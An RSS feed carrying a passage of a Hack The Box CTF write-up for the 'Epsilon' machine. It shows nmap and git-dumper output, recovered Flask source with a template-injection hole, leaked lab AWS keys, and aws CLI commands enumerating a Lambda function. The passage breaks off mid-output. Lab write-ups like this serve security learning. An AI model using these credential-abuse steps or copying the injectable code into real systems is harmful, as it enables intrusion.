<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello World. I am Dito Prabowo</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Wed, 24 Nov 2021 14:21:47 +0700</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HTB UNI CTF - Cloud -  Epsilon Writeup</title>
            <link>/posts/htb-uni-ctf-epsilon-writeup/</link>
            <pubDate>Wed, 24 Nov 2021 14:21:47 +0700</pubDate>
            
            <guid>/posts/htb-uni-ctf-epsilon-writeup/</guid>
            <description>Intro One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.
TLDR  Port 80 exposed public .git folder, dump it Found aws access key, use to get lambda function Found jwt secret key for app, use this to get admin login SSTI in app endpoint /order, get RCE and flag  Recon Nmap Open 10.</description>
            <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
<p>One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.</p>
<h1 id="tldr">TLDR</h1>
<ul>
<li>Port 80 exposed public <code>.git</code> folder, dump it</li>
<li>Found aws access key, use to get lambda function</li>
<li>Found jwt secret key for app, use this to get admin login</li>
<li>SSTI in app endpoint <code>/order</code>, get RCE and flag</li>
</ul>
<h1 id="recon">Recon</h1>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">22</span>
Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span>
Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>

PORT     STATE SERVICE REASON  VERSION
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp   open  ssh     syn<span style="color:#f92672">-</span>ack OpenSSH <span style="color:#ae81ff">8.2</span>p1 Ubuntu <span style="color:#ae81ff">4</span>ubuntu0<span style="color:#ae81ff">.2</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp   open  http    syn<span style="color:#f92672">-</span>ack Apache httpd <span style="color:#ae81ff">2.4.41</span>
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>git:
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>
<span style="color:#f92672">|</span>     Git repository found<span style="color:#960050;background-color:#1e0010">!</span>
<span style="color:#f92672">|</span>     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the<span style="color:#f92672">...</span>
<span style="color:#f92672">|</span>_    Last commit message: Updating Tracking API  <span style="color:#75715e"># Please enter the commit message for...</span>
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
<span style="color:#f92672">|</span>_  Supported Methods: OPTIONS HEAD GET POST
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.41</span> (Ubuntu)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: <span style="color:#ae81ff">403</span> Forbidden
<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>tcp open  http    syn<span style="color:#f92672">-</span>ack Werkzeug httpd <span style="color:#ae81ff">2.0.2</span> (Python <span style="color:#ae81ff">3.8.10</span>)
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
<span style="color:#f92672">|</span>_  Supported Methods: POST HEAD OPTIONS GET
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Werkzeug<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0.2</span> Python<span style="color:#f92672">/</span><span style="color:#ae81ff">3.8.10</span>
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Costume Shop
Service Info: Host: <span style="color:#ae81ff">127.0.1.1</span>; OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
</code></pre></div><h2 id="git-dumper">Git Dumper</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">~/.</span>local<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>git<span style="color:#f92672">-</span>dumper http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git <span style="color:#f92672">.</span>
[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>HEAD [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span> [<span style="color:#ae81ff">403</span>]
[<span style="color:#f92672">-</span>] Fetching common files
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>description [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>applypatch<span style="color:#f92672">-</span>msg<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>update<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>pre<span style="color:#f92672">-</span>applypatch<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">404</span>]
[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
<span style="color:#f92672">...</span>
[<span style="color:#f92672">-</span>] Finding packs
[<span style="color:#f92672">-</span>] Finding objects
[<span style="color:#f92672">-</span>] Fetching objects
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>c<span style="color:#f92672">/</span><span style="color:#ae81ff">52105750831385</span>d4756111e1103957ac599d02 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b1<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>dd06d56ac760efbbb5d254ea43bf9beb56d2d [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> [<span style="color:#ae81ff">404</span>]
[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c5<span style="color:#f92672">/</span><span style="color:#ae81ff">1441640</span>fd25e9fba42725147595b5918eba0f1 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">7</span>c<span style="color:#f92672">/</span>f92a7a09e523c1c667d13847c9ba22464412f3 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>df<span style="color:#f92672">/</span>dfa17ca5701b1dca5069b6c3f705a038f4361e [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c6<span style="color:#f92672">/</span><span style="color:#ae81ff">22771686</span>bd74c16ece91193d29f85b5f9ffa91 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ce<span style="color:#f92672">/</span><span style="color:#ae81ff">401</span>ccecf421ff19bf43fafe8a60a0d0f0682d0 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">3</span>b52e153c7d5380b183bbbb51f5d4020944630 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">65</span><span style="color:#f92672">/</span>b80f62da28254f67f0bea392057fd7d2330e2d [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ab<span style="color:#f92672">/</span><span style="color:#ae81ff">07</span>f7cdc7f410b8c8f848ee5674ec550ecb61ca [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b5<span style="color:#f92672">/</span>f4c99c772eeb629e53d284275458d75ed9a010 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>cf<span style="color:#f92672">/</span><span style="color:#ae81ff">489</span>a3776d2bf87ac32de4579e852a4dc116ce8 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">54</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>f6fe2204336c1ea21720cbaa47572eb566e34 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>fe<span style="color:#f92672">/</span>d7ab97cf361914f688f0e4f2d3adfafd1d7dca [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Running git checkout <span style="color:#f92672">.</span>

</code></pre></div><p>found 2 file <code>server.py</code> and <code>track_api_CR_148.py</code> but cant find real secret key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">server<span style="color:#f92672">.</span>py

<span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#f92672">import</span> jwt
<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

app <span style="color:#f92672">=</span> Flask(__name__)
secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;secret_key&gt;&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_jwt</span>(token,key):
        <span style="color:#66d9ef">try</span>:
                username<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>decode(token,key,algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>,])[<span style="color:#e6db74">&#39;username&#39;</span>]
                <span style="color:#66d9ef">if</span> username:
                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
        <span style="color:#66d9ef">except</span>:
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">and</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span>:
                        res <span style="color:#f92672">=</span> make_response()
                        username<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
                        token<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>},secret,algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
                        res<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;auth&#34;</span>,token)
                        res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/home&#39;</span>
                        <span style="color:#66d9ef">return</span> res,<span style="color:#ae81ff">302</span>
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/home&#34;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;home.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/track&#34;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">track</span>():
        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>,message<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/order&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">order</span>():
        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                        costume<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;costume&#34;</span>]
                        message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">                        Your order of &#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; has been placed successfully.
</span><span style="color:#e6db74">                        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(costume)
                        tmpl<span style="color:#f92672">=</span>render_template_string(message,costume<span style="color:#f92672">=</span>costume)
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>,message<span style="color:#f92672">=</span>tmpl)
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span>)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">track_api_CR_148<span style="color:#f92672">.</span>py
<span style="color:#f92672">import</span> io
<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> zipfile <span style="color:#f92672">import</span> ZipFile
<span style="color:#f92672">from</span> boto3.session <span style="color:#f92672">import</span> Session


session <span style="color:#f92672">=</span> Session(
    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
    region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span>)
aws_lambda <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>client(<span style="color:#e6db74">&#39;lambda&#39;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">files_to_zip</span>(path):
    <span style="color:#66d9ef">for</span> root, dirs, files <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(path):
        <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> files:
            full_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(root, f)
            archive_name <span style="color:#f92672">=</span> full_path[len(path) <span style="color:#f92672">+</span> len(os<span style="color:#f92672">.</span>sep):]
            <span style="color:#66d9ef">yield</span> full_path, archive_name


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_zip_file_bytes</span>(path):
    buf <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO()
    <span style="color:#66d9ef">with</span> ZipFile(buf, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> z:
        <span style="color:#66d9ef">for</span> full_path, archive_name <span style="color:#f92672">in</span> files_to_zip(path<span style="color:#f92672">=</span>path):
            z<span style="color:#f92672">.</span>write(full_path, archive_name)
    <span style="color:#66d9ef">return</span> buf<span style="color:#f92672">.</span>getvalue()


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_lambda</span>(lambda_name, lambda_code_path):
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(lambda_code_path):
        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#39;Lambda directory does not exist: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(lambda_code_path))
    aws_lambda<span style="color:#f92672">.</span>update_function_code(
        FunctionName<span style="color:#f92672">=</span>lambda_name,
        ZipFile<span style="color:#f92672">=</span>make_zip_file_bytes(path<span style="color:#f92672">=</span>lambda_code_path))
</code></pre></div><p>Enumerating on git log, found aws access key that can used to access.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span style="color:#f92672">(</span>HEAD -&gt; master<span style="color:#f92672">)</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 17:41:07 <span style="color:#ae81ff">2021</span> +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:02:59 <span style="color:#ae81ff">2021</span> +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:58 <span style="color:#ae81ff">2021</span> +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:28 <span style="color:#ae81ff">2021</span> +0000

    Adding Tracking API Module


$ git diff master 7cf92a7a09e523c1c667d13847c9ba22464412f3

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 8d3b52e..fed7ab9 <span style="color:#ae81ff">100644</span>
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,11 +5,11 @@ from boto3.session import Session
...
-    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
-    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
+    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;AQLA5M37BDN6FJP76TDC&#39;</span>,
+    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;</span>,
     region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
-    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span><span style="color:#f92672">)</span>
-aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>
+    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilong.htb&#39;</span><span style="color:#f92672">)</span>
+aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>

</code></pre></div><h1 id="pwning">PWNING</h1>
<p>we get aws cred and there is endpoint aws lambda in code, try to enumerate and get function from aws lambda.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>AQLA5M37BDN6FJP76TDC                                                                                    
export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A  
export AWS_REGION<span style="color:#f92672">=</span>us-east-1

aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda list-functions

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;Functions&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;FunctionName&#34;</span>: <span style="color:#e6db74">&#34;costume_shop_v1&#34;</span>,
            <span style="color:#e6db74">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&#34;</span>,
            <span style="color:#e6db74">&#34;Runtime&#34;</span>: <span style="color:#e6db74">&#34;python3.7&#34;</span>,
            <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::123456789012:role/service-role/dev&#34;</span>,
            <span style="color:#e6db74">&#34;Handler&#34;</span>: <span style="color:#e6db74">&#34;my-function.handler&#34;</span>,
            <span style="color:#e6db74">&#34;CodeSize&#34;</span>: 478,
            <span style="color:#e6db74">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
            <span style="color:#e6db74">&#34;Timeout&#34;</span>: 3,
            <span style="color:#e6db74">&#34;LastModified&#34;</span>: <span style="color:#e6db74">&#34;2021-11-24T07:24:25.324+0000&#34;</span>,
            <span style="color:#e6db74">&#34;CodeSha256&#34;</span>: <span style="color:#e6db74">&#34;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&#34;</span>,
            <span style="color:#e6db74">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;</span>$LATEST<span style="color:#e6db74">&#34;</span>,
            <span style="color:#e6db74">&#34;VpcConfig&#34;</span>: <span style="color:#f92672">{}</span>,
            <span style="color:#e6db74">&#34;TracingConfig&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;Mode&#34;</span>: <span style="color:#e6db74">&#34;PassThrough&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;RevisionId&#34;</span>: <span style="color:#e6db74">&#34;78b95307-f240-40d3-acd2-373ddccfdbe2&#34;</span>,
            <span style="color:#e6db74">&#34;State&#34;</span>: <span style="color:#e6db74">&#34;Active&#34;</span>,
            <span style="color:#e6db74">&#34;LastUpdateStatus&#34;</span>: <span style="color:#e6db74">&#34;Successful&#34;</span>,
            <span style="color:#e6db74">&#34;PackageType&#34;</span>: <span style="color:#e6db74">&#34;Zip&#34;</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>

aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1

<span style="color:#f92672">}</span>,
    <span style="color:#e6db74">&#34;Code&#34;</span>: <span style="color:#f92672">{</span>
